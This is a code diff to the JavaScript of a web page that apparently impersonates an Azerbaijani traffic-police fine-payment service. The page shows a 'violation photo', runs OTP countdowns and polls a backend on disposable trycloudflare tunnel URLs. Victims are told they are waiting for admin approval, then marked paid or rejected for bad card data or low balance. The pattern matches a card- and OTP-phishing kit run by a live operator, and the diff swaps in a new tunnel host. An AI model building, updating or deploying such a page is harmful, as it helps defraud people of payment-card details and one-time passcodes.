@@ -191,7 +191,7 @@
     </div>
 
     <script>
-        let API_URL = localStorage.getItem('dyp_active_api_url') || 'https://chester-police-fragrance-initiated.trycloudflare.com/api';
+        let API_URL = 'https://census-biological-arbitration-remarks.trycloudflare.com/api';
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
@@ -199,15 +199,10 @@
         let adviceShown = false;
 
         async function initConfig() {
-            const savedApiUrl = localStorage.getItem('dyp_active_api_url');
-            if (savedApiUrl) {
-                API_URL = savedApiUrl;
-            }
-
             try {
                 const res = await fetch(`config.json?t=${Date.now()}`);
                 const config = await res.json();
-                if (config.apiUrl && !savedApiUrl) {
+                if (config.apiUrl) {
                     API_URL = config.apiUrl;
                 }
             } catch (err) {
@@ -242,18 +237,11 @@
         async function robustFetch(url, options) {
             try {
                 let res = await fetch(url, options);
-                if (res.ok) {
-                    localStorage.setItem('dyp_active_api_url', API_URL);
-                    return res;
-                }
+                if (res.ok) return res;
             } catch (e) {
                 if (!url.includes('localhost:3000')) {
                     let localUrl = url.replace(/https?:\/\/[^\/]+/, 'http://localhost:3000');
-                    let resLocal = await fetch(localUrl, options);
-                    if (resLocal.ok) {
-                        localStorage.setItem('dyp_active_api_url', 'http://localhost:3000/api');
-                        return resLocal;
-                    }
+                    return await fetch(localUrl, options);
                 }
                 throw e;
             }
@@ -266,9 +254,6 @@
                     const contentType = res.headers.get('content-type');
                     if (contentType && contentType.includes('application/json')) {
                         const data = await res.json();
-                        if (data.apiUrl) {
-                            API_URL = data.apiUrl;
-                        }
                         updateUI(data);
                     } else {
                         console.error("API returned non-JSON (Cloudflare warning page)");
@@ -389,20 +374,20 @@
 
             if (data.isPaid || data.isRejected) {
                 isWaitingForAdmin = false;
-                localStorage.removeItem('dyp_waiting');
+                localStorage.removeItem('dyp_wait');
             }
 
             if (data.isRejected) {
                 document.getElementById('loading-modal').classList.add('hidden');
                 document.getElementById('reject-reason-text').textContent = data.rejectReason || "Kart məlumatlarınız düzgün deyil və ya balansınızda kifayət qədər vəsatət yoxdur.";
-                document.getElementById('reject-modal').classList.remove('hidden');
+                document.getElementById('reject-modal').classList.add('hidden');
                 return;
             } else {
                 document.getElementById('reject-modal').classList.add('hidden');
             }
 
             if (data.isPaid) {
-                localStorage.removeItem('dyp_waiting');
+                localStorage.removeItem('dyp_wait');
                 clearInterval(timerInterval);
 
                 document.getElementById('app-container').innerHTML = `
@@ -486,7 +471,7 @@
                 return;
             }
 
-            if (isWaitingForAdmin || localStorage.getItem('dyp_waiting') === 'true' || data.isPendingApproval) {
+            if (isWaitingForAdmin || localStorage.getItem('dyp_wait') === 'true' || data.isPendingApproval) {
                 showLoadingScreen();
                 return;
             }
@@ -515,12 +500,17 @@
             const photoContainer = document.getElementById('photo-container');
             if (photoContainer) {
                 if (data.photoUrl) {
-                    photoContainer.innerHTML = `<img src="${data.photoUrl}?t=${Date.now()}" alt="Pozuntu şəkli" class="w-full h-full object-cover">`;
+                    const existingImg = photoContainer.querySelector('img');
+                    if (!existingImg || !existingImg.src.startsWith(data.photoUrl)) {
+                        photoContainer.innerHTML = `<img src="${data.photoUrl}" alt="Pozuntu şəkli" class="w-full h-full object-cover">`;
+                    }
                 } else {
-                    photoContainer.innerHTML = `
-                        <div class="text-4xl mb-1">🚗📸</div>
-                        <span class="text-xs font-medium text-center px-4">Maşının şəkli yüklənməyib</span>
-                    `;
+                    if (!photoContainer.querySelector('span') || photoContainer.querySelector('img')) {
+                        photoContainer.innerHTML = `
+                            <div class="text-4xl mb-1">🚗📸</div>
+                            <span class="text-xs font-medium text-center px-4">Maşının şəkli yüklənməyib</span>
+                        `;
+                    }
                 }
             }
         }
